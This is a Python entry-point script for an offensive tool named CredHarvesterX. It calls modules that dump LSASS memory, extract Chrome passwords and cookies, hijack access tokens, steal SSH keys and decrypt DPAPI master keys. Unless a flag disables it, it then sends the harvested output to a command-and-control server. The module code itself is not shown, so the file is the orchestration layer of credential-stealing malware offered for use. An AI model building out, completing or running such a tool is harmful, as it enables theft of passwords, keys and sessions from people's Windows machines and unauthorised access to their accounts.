#!/usr/bin/env python3
"""
CredHarvesterX - main.py
Author: mchyasn
"""

import argparse
import platform
import sys
from lsass_dump import dump_lsass
from chrome_creds import extract_chrome_credentials
from token_hijack import enumerate_tokens
from ssh_key_grabber import grab_ssh_keys
from dpapi_decrypt import decrypt_dpapi_masterkeys
from c2_output import send_output
from utils import ensure_admin, create_output_dirs
from colorama import Fore, Style


def check_platform():
    if platform.system() != "Windows":
        print(Fore.YELLOW + "[!] Warning: CredHarvesterX is designed for Windows. Some modules will be disabled." + Style.RESET_ALL)


def main():
    parser = argparse.ArgumentParser(description="CredHarvesterX - Advanced Credential Dumper")
    parser.add_argument("--no-c2", action="store_true", help="Disable C2/LogSentinel output")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose output")
    args = parser.parse_args()

    check_platform()

    if not ensure_admin():
        print(Fore.RED + "[!] Admin privileges are required to run most modules." + Style.RESET_ALL)
        return

    create_output_dirs()

    print(Fore.CYAN + "[*] Dumping LSASS credentials..." + Style.RESET_ALL)
    dump_lsass(verbose=args.verbose)

    print(Fore.CYAN + "[*] Extracting Chrome credentials and cookies..." + Style.RESET_ALL)
    extract_chrome_credentials(verbose=args.verbose)

    print(Fore.CYAN + "[*] Enumerating and hijacking access tokens..." + Style.RESET_ALL)
    enumerate_tokens(verbose=args.verbose)

    print(Fore.CYAN + "[*] Grabbing SSH keys from user profile..." + Style.RESET_ALL)
    grab_ssh_keys(verbose=args.verbose)

    print(Fore.CYAN + "[*] Decrypting DPAPI masterkeys (if found)..." + Style.RESET_ALL)
    decrypt_dpapi_masterkeys(verbose=args.verbose)

    if not args.no_c2:
        print(Fore.YELLOW + "[*] Sending output to C2/LogSentinel..." + Style.RESET_ALL)
        send_output()

    print(Fore.GREEN + "[+] CredHarvesterX complete." + Style.RESET_ALL)


if __name__ == "__main__":
    main()
